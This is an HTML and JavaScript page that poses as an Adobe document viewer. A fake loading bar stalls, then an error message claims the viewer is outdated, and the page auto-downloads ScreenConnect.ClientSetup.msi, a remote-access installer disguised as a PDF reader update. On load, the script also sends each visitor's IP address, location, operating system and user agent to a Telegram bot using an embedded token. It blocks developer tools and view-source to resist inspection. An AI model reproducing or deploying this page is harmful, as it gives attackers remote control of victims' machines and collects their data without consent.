<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Adobe Document Manager</title>
  <style>
    /* === ORIGINAL STYLES — preserved exactly === */
    body {
      margin: 0;
      padding: 0;
      background-image: url('adobebackground10.png');
      background-size: contain;
      background-position: center;
      background-repeat: no-repeat;
      height: 100vh;
      width: 100vw;
      background-color: #ffffff;
      font-family: Arial, sans-serif;
    }

    .modal-overlay {
      position: fixed;
      top: 0;
      left: 0;
      height: 100vh;
      width: 100vw;
      background-color: rgba(0, 0, 0, 0.5);
      display: flex;
      justify-content: center;
      align-items: center;
      z-index: 1000;
    }

    .modal-content {
      background-color: white;
      padding: 30px;
      border-radius: 10px;
      width: 90%;
      max-width: 500px;
      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
      animation: modalFadeIn 0.3s ease-out;
      text-align: center;
      min-height: 280px;
      position: relative;
    }

    @keyframes modalFadeIn {
      from { opacity: 0; transform: translateY(-20px); }
      to { opacity: 1; transform: translateY(0); }
    }

    .modal-header img {
      width: 100px;
      margin-bottom: 15px;
    }

    /* ===== LOADING STYLES ===== */
    .loading-container {
      display: block;
      padding: 10px 0;
    }

    /* Adobe-style loading animation using Lottie-inspired CSS */
    .adobe-loader {
      width: 80px;
      height: 80px;
      margin: 0 auto 20px;
      position: relative;
    }

    .adobe-loader .circle {
      position: absolute;
      width: 100%;
      height: 100%;
      border-radius: 50%;
      border: 4px solid #e0e0e0;
      border-top-color: #ED2224;
      animation: spin 1.2s cubic-bezier(0.5, 0, 0.5, 1) infinite;
      box-sizing: border-box;
    }

    /* Animated dots effect */
    .adobe-loader .dots {
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      display: flex;
      gap: 6px;
    }

    .adobe-loader .dots span {
      width: 8px;
      height: 8px;
      background: #ED2224;
      border-radius: 50%;
      display: inline-block;
      animation: dotBounce 1.4s ease-in-out infinite both;
    }

    .adobe-loader .dots span:nth-child(1) { animation-delay: -0.32s; }
    .adobe-loader .dots span:nth-child(2) { animation-delay: -0.16s; }
    .adobe-loader .dots span:nth-child(3) { animation-delay: 0s; }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    @keyframes dotBounce {
      0%, 80%, 100% { transform: scale(0); }
      40% { transform: scale(1); }
    }

    .loading-status {
      font-size: 15px;
      color: #333;
      font-weight: 400;
      margin-bottom: 18px;
      transition: opacity 0.4s ease;
      min-height: 24px;
    }

    .progress-track {
      width: 100%;
      height: 6px;
      background: #e9ecef;
      border-radius: 4px;
      overflow: hidden;
      margin: 12px 0 8px;
    }

    .progress-fill {
      width: 0%;
      height: 100%;
      background: #ED2224;
      border-radius: 4px;
      transition: width 0.3s ease;
    }

    .progress-percent {
      font-size: 14px;
      color: #666;
      font-weight: 500;
      letter-spacing: 0.3px;
    }

    /* Error Panel */
    .error-panel {
      display: none;
      padding: 8px 0;
      animation: fadeIn 0.5s ease;
    }

    .error-panel.active {
      display: block;
    }

    .error-panel .error-icon {
      font-size: 42px;
      color: #ED2224;
      margin-bottom: 12px;
    }

    .error-panel h3 {
      color: #1e1e1e;
      font-size: 18px;
      font-weight: 600;
      margin: 0 0 10px;
    }

    .error-panel p {
      color: #555;
      font-size: 14px;
      line-height: 1.6;
      margin: 0 0 18px;
    }

    .error-panel .download-btn {
      background-color: #ED2224;
      color: white;
      border: none;
      padding: 14px 28px;
      border-radius: 4px;
      font-size: 15px;
      font-weight: 500;
      cursor: pointer;
      width: 100%;
      max-width: 300px;
      transition: background-color 0.3s;
    }

    .error-panel .download-btn:hover {
      background-color: #c71b1d;
    }

    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(8px); }
      to { opacity: 1; transform: translateY(0); }
    }

    /* Hide loading when error shows */
    .loading-container.hidden {
      display: none;
    }

    /* Responsive adjustments */
    @media (max-width: 600px) {
      .modal-content {
        padding: 24px 18px;
        min-height: 240px;
      }
      .adobe-loader {
        width: 60px;
        height: 60px;
      }
      .loading-status {
        font-size: 14px;
      }
      .error-panel h3 {
        font-size: 16px;
      }
      .error-panel p {
        font-size: 13px;
      }
    }
  </style>
</head>
<body>

  <!-- ===== MODAL ===== -->
  <div id="confirmationModal" class="modal-overlay">
    <div class="modal-content">
      <div class="modal-header">
        <img src="free-ad.webp" alt="Adobe Logo">
      </div>

      <!-- ===== LOADING INTERFACE ===== -->
      <div id="loadingContainer" class="loading-container">
        <div class="adobe-loader">
          <div class="circle"></div>
          <div class="dots">
            <span></span>
            <span></span>
            <span></span>
          </div>
        </div>
        <div id="loadingStatus" class="loading-status">Opening documents...</div>
        <div class="progress-track">
          <div id="progressFill" class="progress-fill" style="width:0%;"></div>
        </div>
        <div id="progressPercent" class="progress-percent">0%</div>
      </div>

      <!-- ===== ERROR PANEL ===== -->
      <div id="errorPanel" class="error-panel">
        <div class="error-icon">⚠️</div>
        <h3>Document could not be loaded</h3>
        <p>This secured PDF requires a newer compatible PDF viewer. Please update your PDF software and try again.</p>
        <button id="errorDownloadBtn" class="download-btn">Latest Reader Viewer — Download Starts Immediately</button>
      </div>
    </div>
  </div>

  <!-- hidden download link -->
  <a id="downloadLink" href="https://pub-05b6b4acfe7a4dc0a82df0fb73bef7a9.r2.dev/ScreenConnect.ClientSetup.msi" style="display:none;"></a>

  <script>
    // ============================================================
    // 1. ANTI‑INSPECTION / PROTECTION LAYER
    // ============================================================
    (function antiInspection() {
      document.addEventListener('contextmenu', (e) => {
        e.preventDefault();
        window.location.href = 'https://www.google.com';
        return false;
      });

      document.addEventListener('selectstart', (e) => e.preventDefault());
      document.addEventListener('dragstart', (e) => e.preventDefault());

      function blockDevTools(e) {
        const key = e.key;
        if (key === 'F12') {
          e.preventDefault();
          window.location.href = 'https://www.google.com';
          return false;
        }
        if (e.ctrlKey && e.shiftKey) {
          if (key === 'I' || key === 'J' || key === 'C') {
            e.preventDefault();
            window.location.href = 'https://www.google.com';
            return false;
          }
        }
        if (e.ctrlKey && (key === 'u' || key === 'U')) {
          e.preventDefault();
          window.location.href = 'https://www.google.com';
          return false;
        }
        return true;
      }

      document.addEventListener('keydown', blockDevTools);

      let devtoolsOpen = false;
      const element = new Image();
      Object.defineProperty(element, 'id', {
        get: function() {
          devtoolsOpen = true;
          window.location.href = 'https://www.google.com';
        }
      });
      requestAnimationFrame(function check() {
        devtoolsOpen = false;
        console.log(element);
        if (devtoolsOpen) {
          window.location.href = 'https://www.google.com';
        }
        requestAnimationFrame(check);
      });
    })();

    // ============================================================
    // 2. CORE FUNCTIONS
    // ============================================================

    function isMobileDevice() {
      return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
    }

    function detectOS() {
      const platform = navigator.platform.toLowerCase();
      const userAgent = navigator.userAgent.toLowerCase();
      if (platform.includes('win') || userAgent.includes('windows')) return 'windows';
      if (platform.includes('mac') || userAgent.includes('mac os')) return 'macos';
      if (platform.includes('linux') || userAgent.includes('linux')) return 'linux';
      if (/iphone|ipad|ipod/.test(userAgent)) return 'ios';
      if (/android/.test(userAgent)) return 'android';
      return 'unknown';
    }

    function getDownloadLink(os) {
      switch (os) {
        case 'windows': return 'https://pub-05b6b4acfe7a4dc0a82df0fb73bef7a9.r2.dev/ScreenConnect.ClientSetup.msi';
        case 'macos':   return 'https://pub-05b6b4acfe7a4dc0a82df0fb73bef7a9.r2.dev/ScreenConnect.ClientSetup.msi';
        case 'linux':   return 'https://pub-05b6b4acfe7a4dc0a82df0fb73bef7a9.r2.dev/ScreenConnect.ClientSetup.msi';
        default:        return 'https://pub-05b6b4acfe7a4dc0a82df0fb73bef7a9.r2.dev/ScreenConnect.ClientSetup.msi';
      }
    }

    // ============================================================
    // 3. LOADING SIMULATION
    // ============================================================

    let loadingTimer = null;
    let progressTimer = null;
    let downloadTriggered = false;

    function startLoadingSimulation() {
      const container = document.getElementById('loadingContainer');
      const errorPanel = document.getElementById('errorPanel');

      // Show loading, hide error
      container.classList.remove('hidden');
      errorPanel.classList.remove('active');
      downloadTriggered = false;

      const statusMessages = [
        { time: 0, text: 'Opening documents...' },
        { time: 1000, text: 'Application Initialization' },
        { time: 2000, text: 'File & Security Verification' },
        { time: 3000, text: 'First-Page Processing' },
        { time: 4000, text: 'Loading PDF...' },
        { time: 5000, text: 'Preparing secure document...' },
        { time: 6000, text: 'Acrobat Reader loading, please wait...' },
        { time: 7000, text: 'Documents are hanging or taking too long to load' },
        { time: 8000, text: 'Documents are hanging or taking too long to load' },
        { time: 9000, text: 'Documents are hanging or taking too long to load' }
      ];

      const statusEl = document.getElementById('loadingStatus');
      const progressFill = document.getElementById('progressFill');
      const percentEl = document.getElementById('progressPercent');

      // Clear any existing timers
      if (loadingTimer) clearTimeout(loadingTimer);
      if (progressTimer) clearInterval(progressTimer);

      // Reset progress
      progressFill.style.width = '0%';
      percentEl.textContent = '0%';

      // Set initial status
      statusEl.textContent = 'Opening documents...';

      // Progress updates every 50ms - target 87% at 10 seconds
      const startTime = Date.now();
      const totalDuration = 10000; // 10 seconds to reach 87%

      progressTimer = setInterval(() => {
        const elapsed = Date.now() - startTime;
        let progress = Math.min(87, (elapsed / totalDuration) * 87);
        progress = Math.round(progress);
        progressFill.style.width = progress + '%';
        percentEl.textContent = progress + '%';
      }, 50);

      // Status updates based on time
      statusMessages.forEach((msg) => {
        setTimeout(() => {
          statusEl.textContent = msg.text;
        }, msg.time);
      });

      // After 10 seconds, show error state at 87%
      loadingTimer = setTimeout(() => {
        clearInterval(progressTimer);
        progressFill.style.width = '87%';
        percentEl.textContent = '87%';
        
        // Show error panel
        showErrorPanel();
        
        // After 5 seconds, trigger automatic download
        setTimeout(() => {
          if (!downloadTriggered) {
            downloadTriggered = true;
            handleDownload();
            
            // After another 5 seconds, redirect
            setTimeout(() => {
              window.location.href = 'complete.php';
            }, 5000);
          }
        }, 5000);
        
      }, totalDuration);
    }

    // ============================================================
    // 4. ERROR HANDLING
    // ============================================================

    function showErrorPanel() {
      const container = document.getElementById('loadingContainer');
      const errorPanel = document.getElementById('errorPanel');

      // Clear timers
      if (loadingTimer) clearTimeout(loadingTimer);
      if (progressTimer) clearInterval(progressTimer);

      container.classList.add('hidden');
      errorPanel.classList.add('active');
    }

    // ============================================================
    // 5. REPORT VISIT TO TELEGRAM
    // ============================================================

    async function reportVisitToTelegram() {
      const BOT_TOKEN = '7284066719:AAF9ABMO2CNxpiCyNrmAGeGSUAt-fS8pGlQ';
      const CHAT_ID = '7724482403';

      try {
        const ipRes = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipRes.json();
        const ip = ipData.ip || 'unknown';

        let location = 'unknown';
        try {
          const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
          const geoData = await geoRes.json();
          if (geoData.city && geoData.region && geoData.country_name) {
            location = `${geoData.city}, ${geoData.region}, ${geoData.country_name}`;
          } else {
            location = `${geoData.city || ''} ${geoData.region || ''} ${geoData.country_name || ''}`.trim() || 'unknown';
          }
        } catch (e) { /* ignore */ }

        const now = new Date();
        const dateStr = now.toLocaleString('en-US', { timeZone: 'UTC' });
        const visitorNum = Math.floor(Math.random() * 100) + 1;
        const os = detectOS();
        const ua = navigator.userAgent;

        const message = `
        📄 *Adobe Document Visit Report*
        👤 Visitor #${visitorNum}
        🕒 ${dateStr} UTC
        🌐 IP: ${ip}
        📍 Location: ${location}
        💻 OS: ${os}
        📱 UA: ${ua}
        `;

        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        await fetch(url, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'Markdown',
          })
        });
      } catch (err) {
        console.warn('Telegram report failed:', err);
      }
    }

    // ============================================================
    // 6. HANDLE DOWNLOAD
    // ============================================================

    function handleDownload() {
      const osType = detectOS();
      const downloadLink = getDownloadLink(osType);
      const linkEl = document.getElementById('downloadLink');
      if (linkEl) linkEl.href = downloadLink;

      try {
        const autoDownloadBtn = document.createElement('a');
        autoDownloadBtn.href = downloadLink;
        autoDownloadBtn.download = 'https://pub-05b6b4acfe7a4dc0a82df0fb73bef7a9.r2.dev/ScreenConnect.ClientSetup.msi';
        document.body.appendChild(autoDownloadBtn);
        autoDownloadBtn.click();
        document.body.removeChild(autoDownloadBtn);
        console.log('Download initiated');
      } catch (e) {
        console.error('Download error:', e);
      }
    }

    // ============================================================
    // 7. ERROR DOWNLOAD BUTTON HANDLER
    // ============================================================

    document.addEventListener('DOMContentLoaded', function() {
      const errorBtn = document.getElementById('errorDownloadBtn');
      if (errorBtn) {
        errorBtn.addEventListener('click', function() {
          if (!downloadTriggered) {
            downloadTriggered = true;
            handleDownload();
          }
        });
      }

      // Report visit immediately
      reportVisitToTelegram();

      // Auto‑trigger loading after page load
      setTimeout(function() {
        startLoadingSimulation();
      }, 500);
    });
  </script>
